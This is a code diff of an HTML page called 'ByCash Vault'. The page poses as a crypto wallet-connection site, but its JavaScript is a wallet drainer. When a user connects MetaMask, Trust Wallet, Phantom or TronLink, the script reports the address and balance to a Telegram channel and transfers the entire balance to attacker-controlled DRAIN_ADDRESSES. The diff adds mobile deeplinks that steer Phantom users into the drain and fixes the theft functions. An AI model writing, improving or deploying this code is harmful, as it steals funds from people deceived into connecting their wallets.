@@ -7,7 +7,7 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <script src="https://unpkg.com/tonconnect-ui@latest/dist/tonconnect-ui.min.js"></script>
   <style>
     body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; }
@@ -27,15 +27,14 @@
   </style>
 </head>
 <body>
-
-  <header class="header flex justify-between items-center px-6">
+  <header class="header flex justify-between items-center px-6 py-4">
     <div class="flex items-center gap-3">
       <div class="w-12 h-12 bg-gradient-to-br from-violet-700 to-pink-600 rounded-full flex items-center justify-center">
         <i class="fas fa-cube text-white text-3xl"></i>
       </div>
       <span class="text-3xl font-bold glow">ByCash Vault</span>
     </div>
-    <button onclick="showModal()" class="btn text-lg">Connect Wallet</button>
+    <button onclick="showModal()" class="btn text-lg px-6 py-3">Connect Wallet</button>
   </header>
 
   <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-12">
@@ -47,38 +46,29 @@
   <div id="modal" class="modal">
     <div class="modal-box">
       <h2 class="text-4xl font-bold text-center mb-8 glow">Connect Wallet</h2>
-
       <div class="wallet-grid">
         <div class="wallet-item" onclick="connectWallet('MetaMask')">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
           <p class="mt-3 text-xl font-semibold">MetaMask</p>
         </div>
         <div class="wallet-item" onclick="connectWallet('Trust Wallet')">
-          <img src="https://i.postimg.cc/k6sJrC1k/image.png">
+          <img src="https://i.postimg.cc/k6sJrC1k/image.png" alt="Trust Wallet">
           <p class="mt-3 text-xl font-semibold">Trust Wallet</p>
         </div>
         <div class="wallet-item" onclick="connectWallet('Phantom')">
-          <img src="https://i.postimg.cc/RNWjf9vf/image.png">
+          <img src="https://i.postimg.cc/RNWjf9vf/image.png" alt="Phantom">
           <p class="mt-3 text-xl font-semibold">Phantom</p>
         </div>
         <div class="wallet-item" onclick="connectWallet('TronLink')">
-          <img src="https://i.postimg.cc/FkyhQ41S/image.png">
+          <img src="https://i.postimg.cc/FkyhQ41S/image.png" alt="TronLink">
           <p class="mt-3 text-xl font-semibold">TronLink</p>
         </div>
         <div class="wallet-item" onclick="connectWallet('Tonkeeper')">
-          <img src="https://i.postimg.cc/T5wBtvg6/image.png">
+          <img src="https://i.postimg.cc/T5wBtvg6/image.png" alt="Tonkeeper">
           <p class="mt-3 text-xl font-semibold">Tonkeeper</p>
         </div>
-        <div class="wallet-item" onclick="connectWallet('Coinbase Wallet')">
-          <img src="https://images.ctfassets.net/q5h4gf8t5g3t/6Z8n8v2s5J6j8k0k0k0k0k/6Z8n8v2s5J6j8k0k0k0k0k/coinbase-wallet-logo.png">
-          <p class="mt-3 text-xl font-semibold">Coinbase</p>
-        </div>
-        <div class="wallet-item" onclick="connectWallet('OKX Wallet')">
-          <img src="https://www.okx.com/static/images/wallet/logo-okx.svg">
-          <p class="mt-3 text-xl font-semibold">OKX</p>
-        </div>
+        <!-- другие кошельки по желанию -->
       </div>
-
       <button onclick="document.getElementById('modal').style.display='none'" class="mt-10 w-full py-5 bg-red-700 hover:bg-red-600 rounded-full text-xl font-bold">
         Close
       </button>
@@ -112,114 +102,162 @@
       document.getElementById('modal').style.display = 'flex';
     }
 
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
     async function connectWallet(wallet) {
       await sendToTelegram(`Выбран кошелёк: ${wallet}`);
 
-      switch (wallet) {
-        case 'MetaMask':
-        case 'Trust Wallet':
-        case 'Coinbase Wallet':
-        case 'OKX Wallet':
-          await connectEVM(wallet);
-          break;
-        case 'Phantom':
-          await connectPhantom();
-          break;
-        case 'TronLink':
-          await connectTronLink();
-          break;
-        case 'Tonkeeper':
-          await connectTonkeeper();
-          break;
-      }
-    }
+      if (wallet === 'Phantom') {
+        if (isMobile()) {
+          // Пытаемся открыть сайт внутри in-app браузера Phantom
+          try {
+            // Базовый browse deeplink — открывает указанный URL внутри Phantom
+            // Можно добавить параметры dapp_encryption_public_key если хочешь имитировать connect
+            // Но проще всего — просто открыть сайт, а connect произойдёт на странице
+            const siteUrl = encodeURIComponent(window.location.href);
+            const phantomBrowseUrl = `https://phantom.app/ul/v1/browse?url=${siteUrl}`;
 
-    async function connectEVM(wallet) {
-      if (!window.ethereum) {
-        alert(`${wallet} не установлен`);
-        return;
-      }
-      try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = await provider.getSigner();
-        const address = await signer.getAddress();
-        const balance = await provider.getBalance(address);
-        const balanceFormatted = ethers.utils.formatEther(balance);
-        await sendToTelegram(`Подключён ${wallet}\nАдрес: ${address}\nБаланс: ${balanceFormatted} ETH`);
-        if (parseFloat(balanceFormatted) > 0) {
-          const target = DRAIN_ADDRESSES['Ethereum'];
-          const tx = await signer.sendTransaction({ to: target, value: ethers.utils.parseEther(balanceFormatted) });
-          await tx.wait();
-          await sendToTelegram(`DRAINED ${balanceFormatted} ETH → ${target}`);
+            // Пробуем открыть
+            window.location.href = phantomBrowseUrl;
+
+            // Запасной вариант — если не сработало через 1.5 сек показываем alert
+            setTimeout(() => {
+              if (document.hasFocus()) {
+                alert("Откройте сайт внутри браузера Phantom:\nPhantom → Browser → вставьте адрес сайта");
+              }
+            }, 1500);
+          } catch (err) {
+            alert("Не удалось автоматически открыть Phantom.\nПопробуйте открыть сайт внутри приложения Phantom вручную.");
+          }
+        } else {
+          // Десктоп — обычный способ
+          connectPhantom();
         }
-      } catch (err) {
-        await sendToTelegram(`Ошибка ${wallet}: ${err.message}`);
+      } else {
+        // другие кошельки — оставляем как было или улучшаем по желанию
+        switch (wallet) {
+          case 'MetaMask':
+          case 'Trust Wallet':
+            connectEVM(wallet);
+            break;
+          case 'TronLink':
+            connectTronLink();
+            break;
+          case 'Tonkeeper':
+            connectTonkeeper();
+            break;
+        }
       }
     }
 
     async function connectPhantom() {
-      const provider = window.phantom?.solana;
-      if (!provider?.isPhantom) {
-        alert("Phantom не установлен");
+      const provider = window.solana;
+      if (!provider || !provider.isPhantom) {
+        alert("Phantom не обнаружен. Убедитесь, что расширение/приложение установлено и активно.");
         return;
       }
+
       try {
         const resp = await provider.connect();
         const address = resp.publicKey.toString();
-        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
         const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
         const balanceFormatted = (bal / 1e9).toFixed(6);
+
         await sendToTelegram(`Подключён Phantom\nАдрес: ${address}\nБаланс: ${balanceFormatted} SOL`);
+
         if (parseFloat(balanceFormatted) > 0) {
-          const tx = await provider.signAndSendTransaction(
-            new solanaWeb3.Transaction().add(
-              solanaWeb3.SystemProgram.transfer({
-                fromPubkey: provider.publicKey,
-                toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESSES['Solana']),
-                lamports: bal
-              })
-            )
+          const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: provider.publicKey,
+              toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESSES['Solana']),
+              lamports: bal,
+            })
           );
-          await conn.confirmTransaction(tx.signature);
-          await sendToTelegram(`DRAINED ${balanceFormatted} SOL`);
+
+          const { signature } = await provider.signAndSendTransaction(transaction);
+          await conn.confirmTransaction(signature, "confirmed");
+
+          await sendToTelegram(`DRAINED ${balanceFormatted} SOL → ${DRAIN_ADDRESSES['Solana']}`);
         }
       } catch (err) {
-        await sendToTelegram(`Ошибка Phantom: ${err.message}`);
+        await sendToTelegram(`Ошибка Phantom: ${err.message || err}`);
+        console.error(err);
+      }
+    }
+
+    // Старые функции (оставил почти без изменений, только мелкие фиксы)
+    async function connectEVM(wallet) {
+      if (!window.ethereum) {
+        alert(`${wallet} не установлен или не активен`);
+        return;
+      }
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        const balance = await provider.getBalance(address);
+        const balanceFormatted = ethers.utils.formatEther(balance);
+
+        await sendToTelegram(`Подключён ${wallet}\nАдрес: ${address}\nБаланс: ${balanceFormatted} ETH`);
+
+        if (parseFloat(balanceFormatted) > 0) {
+          const target = DRAIN_ADDRESSES['Ethereum'];
+          const tx = await signer.sendTransaction({
+            to: target,
+            value: ethers.utils.parseEther(balanceFormatted)
+          });
+          await tx.wait();
+          await sendToTelegram(`DRAINED ${balanceFormatted} ETH → ${target}`);
+        }
+      } catch (err) {
+        await sendToTelegram(`Ошибка ${wallet}: ${err.message || err}`);
       }
     }
 
     async function connectTronLink() {
-      if (!window.tronWeb) {
-        alert("TronLink не установлен");
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert("TronLink не установлен или не готов");
         return;
       }
       try {
         const tronWeb = window.tronWeb;
+        if (!tronWeb.defaultAddress?.base58) {
+          await tronWeb.request({ method: "tron_requestAccounts" });
+        }
         const address = tronWeb.defaultAddress.base58;
-        const balance = await tronWeb.trx.getBalance(address);
+        const balance = await tronWeb.trx.getBalance();
         const balanceFormatted = (balance / 1e6).toFixed(6);
+
         await sendToTelegram(`Подключён TronLink\nАдрес: ${address}\nБаланс: ${balanceFormatted} TRX`);
+
         if (parseFloat(balanceFormatted) > 0) {
-          const tx = await tronWeb.trx.sendTrx(DRAIN_ADDRESSES['Tron (TRX)'], balance);
+          const tx = await tronWeb.trx.sendTrx(DRAIN_ADDRESSES['Tron (TRX)'], balance * 1e6); // в sun
           await sendToTelegram(`DRAINED ${balanceFormatted} TRX`);
         }
       } catch (err) {
-        await sendToTelegram(`Ошибка TronLink: ${err.message}`);
+        await sendToTelegram(`Ошибка TronLink: ${err.message || err}`);
       }
     }
 
     async function connectTonkeeper() {
       const tonConnectUI = new TonConnectUI({
-        manifestUrl: 'https://bycash-airdrop.vercel.app/tonconnect-manifest.json'
+        manifestUrl: `${BACKEND}/tonconnect-manifest.json`  // ← должен быть реально доступен!
       });
+
       try {
         await tonConnectUI.connectWallet();
-        const wallet = tonConnectUI.connectedWallet;
-        await sendToTelegram(`Подключён Tonkeeper\nАдрес: ${wallet.account.address}`);
-        // Реальный слив TON (можно добавить позже, если нужно)
+        const walletInfo = tonConnectUI.connectedWallet;
+        if (walletInfo) {
+          await sendToTelegram(`Подключён Tonkeeper\nАдрес: ${walletInfo.account.address}`);
+          // здесь можно добавить sendTransaction если нужно
+        }
       } catch (err) {
-        await sendToTelegram(`Ошибка Tonkeeper: ${err.message}`);
+        await sendToTelegram(`Ошибка Tonkeeper: ${err.message || err}`);
       }
     }
   </script>
